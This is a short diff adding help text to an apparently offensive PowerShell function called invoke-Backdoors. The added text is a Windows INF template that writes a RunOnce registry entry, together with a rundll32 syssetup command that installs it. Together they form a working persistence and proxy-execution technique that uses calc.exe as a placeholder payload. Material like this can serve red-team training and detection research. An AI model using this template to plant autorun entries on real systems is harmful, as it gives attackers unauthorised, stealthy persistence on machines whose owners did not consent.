@@ -19,9 +19,34 @@
  
    .Example
    PS:> invoke-Backdoors -Command 'HKLM,%KEY_RUNONCE%\setup,%ADD_4%,0,"calc.exe"'
+      [STRINGS]
+     KEY_RUNONCE = "Software\Microsoft\Windows\CurrentVersion\RunOnce"
+     KEY_REMOVE  = "Software\Microsoft\Windows\CurrentVersion\Uninstall"
+     ADD_1 = "Powershell_Execute"
+     ;; Locasised strings
+     ;;; English
+     ADD_3 = "PowerShell Execution"
+     ADD_4 = "PowerShell:>"
+     [version]
+     signature="$CHICAGO$"
+
+     [DefaultInstall]
+     AddReg = Titre.Reg
+
+     [Titre.Reg]
+     HKLM,%KEY_RUNONCE%\setup,"               "%ADD_1% 
+     HKLM,%KEY_RUNONCE%\setup,"___________________________"
+     HKLM,%KEY_RUNONCE%\setup,%ADD_3%
+     HKLM,%KEY_RUNONCE%\setup,""
+     HKLM,%KEY_RUNONCE%\setup,%ADD_4%,0,"calc.exe"
+     [Question]
+     Prompt 	= %NEW_1%
+     ButtonType = YESNO
+     Title 	= %ADD_1%
 
 
-
+  .References
+     rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 C:\INFPS.inf
 #>
 
 function invoke-Backdoors {
